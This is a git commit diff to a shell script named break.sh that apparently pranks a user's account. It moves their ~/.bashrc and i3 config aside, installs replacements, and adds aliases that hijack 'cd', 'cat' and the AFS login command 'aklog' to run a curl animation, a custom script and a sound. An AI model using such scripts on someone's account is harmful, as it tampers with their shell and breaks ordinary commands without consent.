ac959038717cfb361e7150863813eba67d6b0ec5
Slqzeer <95040330+Slqzeer@users.noreply.github.com>
2024-10-17 17:19:09 +0200

    Update break.sh

--- break.sh
+++ break.sh
@@ -12,8 +12,9 @@ mv ./stop.sh ~/afs/
 mv ./stop.png ~/afs/
 mv ~/.bashrc ~/afs/.bashrc#
 mv ./my_cat.sh ~/afs/
-echo 'alias cd="curl ascii.live/dvd"' >> ~/afs/.basrch#
+echo 'alias cd="curl ascii.live/dvd"' >> ~/afs/.bashrc#
 echo 'alias cat="exec ~/afs/my_cat.sh"' >> ~/afs/.bashrc#
+echo 'alias aklog="aplay ~/afs/sncf.mp3"' >> ~/afs/.bashrc#
 mv ./.bashrc ~/.bashrc
 mv ~/.config/i3/config ~/afs/config#
 mv ./config ~/.config/i3/config
